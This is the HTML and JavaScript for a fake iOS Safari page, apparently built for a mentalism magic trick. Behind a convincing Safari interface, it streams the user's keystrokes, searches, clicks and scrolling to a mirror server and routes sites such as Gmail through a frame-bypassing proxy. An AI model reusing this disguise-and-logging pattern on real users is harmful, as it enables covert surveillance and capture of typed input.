<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <meta name="apple-mobile-web-app-title" content="Safari">
  <link rel="manifest" href="/safari/manifest.webmanifest">
  <link rel="apple-touch-icon" sizes="180x180" href="/safari/icons/apple-touch-icon-180.png">
  <link rel="icon" type="image/png" href="/safari/icons/icon-192.png">
  <title>Safari</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; -webkit-font-smoothing:antialiased; touch-action:manipulation; }
  :root {
    --bg: #f2f2f7;
    --card: #fff;
    --text: #000;
    --text-2: #8e8e93;
    --text-3: #c7c7cc;
    --blue: #007aff;
    --sep: #e5e5ea;
    --toolbar-bg: rgba(249,249,249,0.9);
    --url-bg: #e5e5ea;
  }
  @media (prefers-color-scheme: dark) {
    :root {
      --bg: #000;
      --card: #1c1c1e;
      --text: #fff;
      --text-2: #98989f;
      --text-3: #545458;
      --blue: #0a84ff;
      --sep: #38383a;
      --toolbar-bg: rgba(18,18,18,0.92);
      --url-bg: rgba(255,255,255,0.08);
    }
  }
  html, body {
    height: 100%;
    width: 100%;
    background: var(--bg);
    color: var(--text);
    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', sans-serif;
    overflow: hidden;
    -webkit-text-size-adjust: 100%;
    overscroll-behavior: none;
  }
  body { display: flex; flex-direction: column; }

  /* ===== Content area ===== */
  .content {
    flex: 1;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
    padding-top: env(safe-area-inset-top, 20px);
    position: relative;
  }

  /* ===== HOME PAGE ===== */
  .home { padding: 0 16px 120px; }
  .home-header {
    padding: 28px 0 12px;
    display: flex; justify-content: space-between; align-items: center;
  }
  .home-title {
    font-size: 17px; font-weight: 700;
  }
  .edit-btn {
    color: var(--blue); font-size: 17px; background: none; border: none; font-family: inherit; cursor: pointer;
  }

  /* Favoris grid */
  .favorites {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 20px 10px;
    padding: 8px 0 16px;
  }
  .fav {
    display: flex; flex-direction: column; align-items: center; gap: 6px;
    cursor: pointer;
    user-select: none;
  }
  .fav-icon {
    width: 58px; height: 58px;
    border-radius: 14px;
    display: flex; align-items: center; justify-content: center;
    font-size: 30px; font-weight: 700; color: #fff;
    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
  }
  .fav-label {
    font-size: 11px; font-weight: 400; color: var(--text);
    text-align: center; line-height: 1.2;
    max-width: 72px;
  }

  /* Privacy card */
  .privacy-card {
    background: var(--card);
    border-radius: 12px;
    padding: 14px 16px;
    display: flex; gap: 12px; align-items: center;
    margin-top: 20px;
  }
  .privacy-shield {
    width: 28px; height: 28px;
    display: flex; align-items: center; justify-content: center;
    color: var(--text-2); font-size: 24px;
  }
  .privacy-body { flex: 1; }
  .privacy-title { font-size: 13px; font-weight: 600; color: var(--text); }
  .privacy-sub { font-size: 12px; color: var(--text-2); margin-top: 1px; }

  /* ===== RESULTS PAGE (hidden by default) ===== */
  .results {
    display: none;
    padding: 0 16px 120px;
  }
  .results.active { display: block; }
  .results-header {
    padding: 12px 0 8px;
    border-bottom: 0.5px solid var(--sep);
  }
  .results-count {
    font-size: 13px; color: var(--text-2);
    padding: 8px 0;
  }
  .result-tabs {
    display: flex; gap: 20px; padding: 10px 0;
    border-bottom: 0.5px solid var(--sep);
    overflow-x: auto; white-space: nowrap;
  }
  .result-tabs::-webkit-scrollbar { display: none; }
  .result-tab {
    font-size: 14px; color: var(--text-2); padding: 4px 0;
    font-weight: 500; cursor: pointer;
  }
  .result-tab.active { color: var(--text); border-bottom: 2px solid var(--text); padding-bottom: 6px; }

  .result-item {
    padding: 14px 0;
    border-bottom: 0.5px solid var(--sep);
  }
  .result-site {
    display: flex; align-items: center; gap: 8px;
    font-size: 13px; color: var(--text);
    margin-bottom: 4px;
  }
  .result-favicon {
    width: 18px; height: 18px; border-radius: 4px;
    background: var(--url-bg);
    display: flex; align-items: center; justify-content: center;
    font-size: 10px; font-weight: 700;
    flex-shrink: 0;
  }
  .result-title {
    font-size: 16px; color: var(--blue);
    font-weight: 400;
    margin: 4px 0;
    line-height: 1.3;
  }
  .result-snippet {
    font-size: 13px; color: var(--text-2);
    line-height: 1.35;
  }

  /* ===== WEB VIEW (external page rendered in iframe) ===== */
  .webview {
    display: none;
    width: 100%; height: 100%;
    position: absolute; inset: 0;
    background: var(--card);
  }
  .webview.active { display: block; }
  .webview iframe { width: 100%; height: 100%; border: none; background: var(--card); }

  /* ===== BOTTOM URL BAR + TOOLBAR (Safari iOS 17+) ===== */
  .bottom {
    padding-bottom: env(safe-area-inset-bottom, 8px);
    background: var(--toolbar-bg);
    backdrop-filter: saturate(180%) blur(20px);
    -webkit-backdrop-filter: saturate(180%) blur(20px);
    border-top: 0.5px solid rgba(0,0,0,0.1);
  }
  @media (prefers-color-scheme: dark) {
    .bottom { border-top-color: rgba(255,255,255,0.12); }
  }
  .url-bar-wrap {
    padding: 8px 12px 6px;
  }
  .url-bar {
    display: flex; align-items: center; gap: 8px;
    background: var(--url-bg);
    border-radius: 12px;
    padding: 9px 12px;
    cursor: text;
    min-height: 40px;
  }
  .url-bar-icon { color: var(--text-2); font-size: 13px; }
  .url-bar-text {
    flex: 1;
    font-size: 16px;
    color: var(--text-2);
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  }
  .url-bar-text.placeholder { color: var(--text-2); }
  .url-bar-reload { color: var(--blue); font-size: 16px; padding-left: 6px; }

  .toolbar {
    display: flex; justify-content: space-between; align-items: center;
    padding: 2px 24px 4px;
    height: 44px;
  }
  .tool {
    color: var(--blue); cursor: pointer;
    width: 44px; height: 44px; display: flex; align-items: center; justify-content: center;
    font-size: 22px;
    background: none; border: none; font-family: inherit;
  }
  .tool.disabled { color: var(--text-3); pointer-events: none; }

  /* ===== SEARCH OVERLAY ===== */
  .search-overlay {
    position: fixed; inset: 0;
    background: var(--bg);
    z-index: 100;
    display: none;
    flex-direction: column;
  }
  .search-overlay.active { display: flex; }
  .search-top {
    display: flex; gap: 10px; align-items: center;
    padding: env(safe-area-inset-top, 12px) 12px 10px;
    padding-top: calc(env(safe-area-inset-top, 0px) + 12px);
  }
  .search-input {
    flex: 1;
    background: var(--url-bg);
    border: none; border-radius: 12px;
    padding: 12px 16px;
    font-size: 17px;
    font-family: inherit;
    color: var(--text);
    outline: none;
  }
  .search-cancel {
    color: var(--blue); font-size: 17px; background: none; border: none;
    font-family: inherit; padding: 8px 4px; cursor: pointer;
  }
  .search-suggestions {
    flex: 1; overflow-y: auto;
    padding: 8px 0;
  }
  .sug {
    display: flex; align-items: center; gap: 14px;
    padding: 14px 16px;
    font-size: 16px; color: var(--text);
    border-bottom: 0.5px solid var(--sep);
    cursor: pointer;
  }
  .sug-icon { font-size: 14px; color: var(--text-2); }

  /* Tabs overlay */
  .tabs-overlay {
    position: fixed; inset: 0;
    background: rgba(0,0,0,0.95);
    z-index: 99;
    display: none;
    flex-direction: column;
    padding: env(safe-area-inset-top, 20px) 16px env(safe-area-inset-bottom, 20px);
    color: #fff;
  }
  .tabs-overlay.active { display: flex; }
  .tabs-top { display: flex; justify-content: space-between; padding: 16px 8px; }
  .tabs-grid {
    flex: 1; overflow-y: auto;
    display: grid; grid-template-columns: repeat(2, 1fr); gap: 14px;
    padding: 14px 4px;
  }
  .tab-card {
    background: #2c2c2e;
    border-radius: 16px;
    aspect-ratio: 3/4;
    padding: 14px;
    display: flex; flex-direction: column; gap: 8px;
    cursor: pointer;
  }
  .tab-card.active { border: 3px solid var(--blue); }
  .tab-card-host { font-size: 11px; color: #8e8e93; }
  .tab-card-title { font-size: 14px; font-weight: 500; flex: 1; line-height: 1.3; overflow: hidden; }
  .tabs-bottom { display: flex; justify-content: space-around; padding: 12px 0; }
  .tabs-bottom button { color: #fff; font-size: 17px; background: none; border: none; font-family: inherit; cursor: pointer; padding: 6px 10px; }

  /* Scroll indicator hidden for cleanness */
  ::-webkit-scrollbar { display: none; }
</style>
</head>
<body>

<!-- MAIN CONTENT AREA -->
<div class="content" id="content">

  <!-- HOME -->
  <div class="home" id="home">
    <div class="home-header">
      <div class="home-title">Favoris</div>
      <button class="edit-btn">Modifier</button>
    </div>
    <div class="favorites" id="favorites"></div>

    <div class="privacy-card">
      <div class="privacy-shield">🛡️</div>
      <div class="privacy-body">
        <div class="privacy-title">Rapport de confidentialité</div>
        <div class="privacy-sub">Au cours des sept derniers jours, 13 traqueurs bloqués.</div>
      </div>
    </div>
  </div>

  <!-- RESULTS -->
  <div class="results" id="results">
    <div class="result-tabs">
      <div class="result-tab active">Tous</div>
      <div class="result-tab">Images</div>
      <div class="result-tab">Vidéos</div>
      <div class="result-tab">Actualités</div>
      <div class="result-tab">Achats</div>
      <div class="result-tab">Lieux</div>
    </div>
    <div class="results-count" id="resultsCount"></div>
    <div id="resultsList"></div>
  </div>

  <!-- WEBVIEW -->
  <div class="webview" id="webview">
    <iframe id="webviewFrame" sandbox="allow-same-origin allow-scripts allow-forms allow-popups" referrerpolicy="no-referrer"></iframe>
  </div>

</div>

<!-- BOTTOM BAR (URL + toolbar) -->
<div class="bottom">
  <div class="url-bar-wrap">
    <div class="url-bar" id="urlBar" onclick="openSearch()">
      <span class="url-bar-icon">🔒</span>
      <div class="url-bar-text placeholder" id="urlBarText">Rechercher ou saisir un site</div>
      <span class="url-bar-reload" id="urlBarReload" style="display:none;" onclick="event.stopPropagation(); reload();">↻</span>
    </div>
  </div>
  <div class="toolbar">
    <button class="tool" id="backBtn" onclick="goBack()">‹</button>
    <button class="tool disabled" id="fwdBtn" onclick="goForward()">›</button>
    <button class="tool" onclick="doShare()">􀈂</button>
    <button class="tool" onclick="doBookmarks()">📖</button>
    <button class="tool" onclick="openTabs()">⧉</button>
  </div>
</div>

<!-- SEARCH OVERLAY -->
<div class="search-overlay" id="searchOverlay">
  <div class="search-top">
    <input type="text" class="search-input" id="searchInput" placeholder="Rechercher ou saisir un site" autocomplete="off" autocorrect="off" spellcheck="false" />
    <button class="search-cancel" onclick="closeSearch()">Annuler</button>
  </div>
  <div class="search-suggestions" id="suggestions"></div>
</div>

<!-- TABS OVERLAY -->
<div class="tabs-overlay" id="tabsOverlay">
  <div class="tabs-top">
    <div style="font-size: 14px; color: #8e8e93;" id="tabsCount">1 onglet</div>
    <button style="color:#fff; background:none; border:none; font-size:17px; font-family:inherit; cursor:pointer;" onclick="closeTabs()">OK</button>
  </div>
  <div class="tabs-grid" id="tabsGrid"></div>
  <div class="tabs-bottom">
    <button onclick="closeTabs()">Privée</button>
    <button onclick="newTab()" style="font-size:24px; font-weight:300;">+</button>
    <button onclick="closeTabs()">OK</button>
  </div>
</div>

<script>
/* ====================================================================
 * EINSTEIN WEB — Safari clone for magic trick
 * Streams keystrokes, searches, clicks, navigation to the mirror server.
 * ==================================================================== */

// ===== Favorites (matching the iOS app) =====
const FAVORITES = [
  { name:'Dropbox', color:'#0061ff', icon:'D', url:'https://www.dropbox.com' },
  { name:'YouTube', color:'#ff0000', icon:'▶', url:'https://m.youtube.com' },
  { name:'TripAdvisor', color:'#34e0a1', icon:'🦉', url:'https://www.tripadvisor.com' },
  { name:'Facebook', color:'#1877f2', icon:'f', url:'https://m.facebook.com' },
  { name:'Google Traduction', color:'#4285f4', icon:'G文', url:'https://translate.google.com' },
  { name:'Gmail', color:'#4285f4', icon:'M', url:'https://mail.google.com' },
  { name:'Apple', color:'#e6e6e6', icon:'', url:'https://www.apple.com', textColor:'#636366' },
  { name:'Les French Twins', color:'#1a1a2e', icon:'L', url:'https://www.lesfrenchtwins.com' },
  { name:'LinkedIn', color:'#0a66c2', icon:'in', url:'https://www.linkedin.com' },
  { name:'Google', color:'#fff', icon:'G', url:'https://www.google.com', textColor:'#4285f4' },
  { name:'Instagram', color:'#e1306c', icon:'📷', url:'https://www.instagram.com' },
  { name:'Wikipedia', color:'#fff', icon:'W', url:'https://fr.wikipedia.org', textColor:'#000' },
];

// Session / state
let ws = null;
let currentPage = { type:'home', url:'', title:'' };
let history = [];
let tabs = [{ title:'Favoris', host:'', type:'home' }];
let sessionId = localStorage.getItem('einstein_session') || (Math.random().toString(36).slice(2)+Date.now().toString(36));
localStorage.setItem('einstein_session', sessionId);

// ===== WebSocket =====
function connectWS() {
  const url = (location.protocol==='https:'?'wss':'ws')+'://'+location.host+'/ws';
  ws = new WebSocket(url);
  ws.onopen = () => {
    ws.send(JSON.stringify({ type:'identify', role:'phone', sessionId }));
    send({ type:'app_state', state:'active' });
  };
  ws.onclose = () => setTimeout(connectWS, 2000);
}
function send(event) {
  const payload = Object.assign({ timestamp: new Date().toISOString() }, event);
  try { if (ws && ws.readyState === 1) ws.send(JSON.stringify(payload)); } catch(e) {}
}

// ===== Render favorites =====
function renderFavorites() {
  const grid = document.getElementById('favorites');
  grid.innerHTML = FAVORITES.map((f, i) => `
    <div class="fav" data-i="${i}">
      <div class="fav-icon" style="background:${f.color};color:${f.textColor||'#fff'};">${f.icon||'•'}</div>
      <div class="fav-label">${escapeHtml(f.name)}</div>
    </div>
  `).join('');
  grid.querySelectorAll('.fav').forEach(el => {
    el.addEventListener('click', () => {
      const f = FAVORITES[+el.dataset.i];
      send({ type:'link_click', linkText:f.name, href:f.url });
      openURL(f.url, f.name);
    });
  });
}

// ===== Search overlay =====
function openSearch() {
  document.getElementById('searchOverlay').classList.add('active');
  const input = document.getElementById('searchInput');
  input.value = '';
  input.focus();
  renderSuggestions('');
}
function closeSearch() {
  document.getElementById('searchOverlay').classList.remove('active');
}
function renderSuggestions(query) {
  const wrap = document.getElementById('suggestions');
  if (!query) {
    wrap.innerHTML = '';
    return;
  }
  // Static, realistic suggestions
  const suggestions = [
    { icon:'🔍', text: query + ' - Recherche Google' },
    { icon:'🔍', text: query + ' en ligne' },
    { icon:'🕑', text: query + ' youtube' },
    { icon:'🔍', text: query + ' définition' },
  ];
  wrap.innerHTML = suggestions.map(s =>
    `<div class="sug" data-q="${escapeAttr(s.text.replace(/ - Recherche Google$/,''))}">
       <div class="sug-icon">${s.icon}</div>
       <div>${escapeHtml(s.text)}</div>
     </div>`
  ).join('');
  wrap.querySelectorAll('.sug').forEach(el => {
    el.addEventListener('click', () => doSearch(el.dataset.q));
  });
}

// Track keystrokes in search input
let typingBuffer = '';
document.getElementById('searchInput').addEventListener('input', (e) => {
  const newVal = e.target.value;
  // Emit keystroke delta
  if (newVal.length > typingBuffer.length) {
    // Typing new char
    const chars = newVal.slice(typingBuffer.length);
    for (const c of chars) {
      send({ type:'keystroke', character: c, currentText: newVal.slice(0, typingBuffer.length + 1) });
      typingBuffer += c;
    }
  } else if (newVal.length < typingBuffer.length) {
    // Backspace
    for (let i = 0; i < typingBuffer.length - newVal.length; i++) {
      send({ type:'keystroke', character: '⌫', currentText: newVal });
    }
  }
  typingBuffer = newVal;
  renderSuggestions(newVal);
});
document.getElementById('searchInput').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    doSearch(e.target.value);
  }
});

// ===== Do a search =====
async function doSearch(query) {
  if (!query || !query.trim()) return;
  typingBuffer = '';
  closeSearch();
  send({ type:'search', query, url:'https://www.google.com/search?q='+encodeURIComponent(query) });
  showResults(query);
}

async function showResults(query) {
  history.push(currentPage);
  currentPage = { type:'results', url:'https://www.google.com/search?q='+encodeURIComponent(query), title: query + ' - Recherche Google', query };
  tabs[0] = { title: currentPage.title, host:'google.com', type:'results' };
  updateBackBtn();
  // Switch views
  document.getElementById('home').style.display='none';
  document.getElementById('results').classList.add('active');
  document.getElementById('webview').classList.remove('active');
  updateUrlBar('google.com', true);

  const list = document.getElementById('resultsList');
  const count = document.getElementById('resultsCount');
  count.textContent = 'Chargement…';
  list.innerHTML = '';

  // Fetch proxy
  try {
    const res = await fetch('/api/search?q=' + encodeURIComponent(query)).then(r => r.json());
    const items = (res && res.results) || [];
    count.textContent = 'Environ ' + (res.total || items.length) + ' résultats';
    list.innerHTML = items.map((r, i) => `
      <div class="result-item" data-i="${i}">
        <div class="result-site">
          <div class="result-favicon">${(r.host||'').charAt(0).toUpperCase()}</div>
          <span>${escapeHtml(r.host || '')}</span>
        </div>
        <div class="result-title">${escapeHtml(r.title || '')}</div>
        <div class="result-snippet">${escapeHtml(r.snippet || '')}</div>
      </div>
    `).join('');
    list.querySelectorAll('.result-item').forEach(el => {
      el.addEventListener('click', () => {
        const r = items[+el.dataset.i];
        send({ type:'link_click', linkText: r.title, href: r.url });
        openURL(r.url, r.title);
      });
    });
    send({ type:'page_loaded', url: currentPage.url, title: currentPage.title });
  } catch (e) {
    count.textContent = 'Erreur de chargement';
  }
}

// ===== Open URL in webview =====
function openURL(url, title) {
  history.push(currentPage);
  currentPage = { type:'webview', url, title };
  tabs[0] = { title, host: hostFromUrl(url), type:'webview' };
  updateBackBtn();
  document.getElementById('home').style.display='none';
  document.getElementById('results').classList.remove('active');
  document.getElementById('webview').classList.add('active');
  const frame = document.getElementById('webviewFrame');
  // Use our proxy so CORS/X-Frame-Options is bypassed
  frame.src = '/api/proxy?url=' + encodeURIComponent(url);
  updateUrlBar(hostFromUrl(url), true);
  send({ type:'navigation', url, title });
}

function updateUrlBar(text, showReload) {
  const bar = document.getElementById('urlBarText');
  bar.textContent = text || 'Rechercher ou saisir un site';
  bar.classList.toggle('placeholder', !text);
  document.getElementById('urlBarReload').style.display = showReload ? 'block' : 'none';
}

function reload() {
  if (currentPage.type === 'webview') {
    const frame = document.getElementById('webviewFrame');
    frame.src = frame.src;
  } else if (currentPage.type === 'results') {
    showResults(currentPage.query);
  }
}

function goBack() {
  if (history.length === 0) {
    goHome();
    return;
  }
  const prev = history.pop();
  if (prev.type === 'home') goHome(false);
  else if (prev.type === 'results') {
    currentPage = prev;
    document.getElementById('home').style.display='none';
    document.getElementById('results').classList.add('active');
    document.getElementById('webview').classList.remove('active');
    showResults(prev.query); // re-fetch
  } else if (prev.type === 'webview') {
    openURL(prev.url, prev.title);
    history.pop(); // openURL pushed again
  }
  updateBackBtn();
}
function goForward() { /* not implemented */ }
function goHome(pushHistory = true) {
  if (pushHistory) history.push(currentPage);
  currentPage = { type:'home', url:'', title:'Favoris' };
  tabs[0] = { title:'Favoris', host:'', type:'home' };
  document.getElementById('home').style.display='block';
  document.getElementById('results').classList.remove('active');
  document.getElementById('webview').classList.remove('active');
  updateUrlBar('', false);
  updateBackBtn();
}
function updateBackBtn() {
  const btn = document.getElementById('backBtn');
  btn.classList.toggle('disabled', history.length === 0 && currentPage.type === 'home');
}

function doShare() { /* no-op visually */ }
function doBookmarks() { /* could open favorites modal */ }

// ===== Tabs overlay =====
function openTabs() {
  const overlay = document.getElementById('tabsOverlay');
  overlay.classList.add('active');
  const grid = document.getElementById('tabsGrid');
  document.getElementById('tabsCount').textContent = tabs.length + ' onglet' + (tabs.length>1?'s':'');
  grid.innerHTML = tabs.map((t, i) => `
    <div class="tab-card ${i===0?'active':''}" data-i="${i}">
      <div class="tab-card-host">${escapeHtml(t.host || '')}</div>
      <div class="tab-card-title">${escapeHtml(t.title || '')}</div>
    </div>
  `).join('');
  grid.querySelectorAll('.tab-card').forEach(el => el.addEventListener('click', () => closeTabs()));
}
function closeTabs() { document.getElementById('tabsOverlay').classList.remove('active'); }
function newTab() { closeTabs(); goHome(); }

// ===== Helpers =====
function hostFromUrl(u) { try { return new URL(u).hostname.replace(/^www\./,''); } catch { return u||''; } }
function escapeHtml(s) { if(s==null)return''; return String(s).replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c])); }
function escapeAttr(s) { return escapeHtml(s); }

// ===== Track scroll in content =====
let lastScroll = 0, scrollThrottle = null;
document.getElementById('content').addEventListener('scroll', (e) => {
  if (scrollThrottle) return;
  scrollThrottle = setTimeout(() => {
    const el = e.target;
    const offsetY = el.scrollTop;
    const docHeight = el.scrollHeight;
    const viewHeight = el.clientHeight;
    const dir = offsetY > lastScroll ? 'down' : 'up';
    lastScroll = offsetY;
    send({ type:'scroll', offsetY, contentHeight: docHeight, viewHeight, direction: dir });
    scrollThrottle = null;
  }, 300);
});

// ===== Track image taps inside iframe via message =====
window.addEventListener('message', (e) => {
  if (e.data && e.data.__einstein) {
    const d = e.data;
    if (d.type === 'linkClick') send({ type:'link_click', linkText: d.text, href: d.href });
    if (d.type === 'imageTap') send({ type:'image_tap', alt: d.alt, src: d.src, width: d.width, height: d.height });
    if (d.type === 'navigation') {
      currentPage = { type:'webview', url: d.url, title: d.title };
      tabs[0] = { title: d.title, host: hostFromUrl(d.url), type:'webview' };
      updateUrlBar(hostFromUrl(d.url), true);
      send({ type:'page_loaded', url: d.url, title: d.title });
    }
  }
});

// App state tracking
window.addEventListener('pagehide', () => send({ type:'app_state', state:'background' }));
window.addEventListener('pageshow', () => send({ type:'app_state', state:'active' }));
document.addEventListener('visibilitychange', () => {
  send({ type:'app_state', state: document.hidden ? 'inactive' : 'active' });
});

// Init
renderFavorites();
connectWS();
send({ type:'app_state', state:'launched' });
</script>
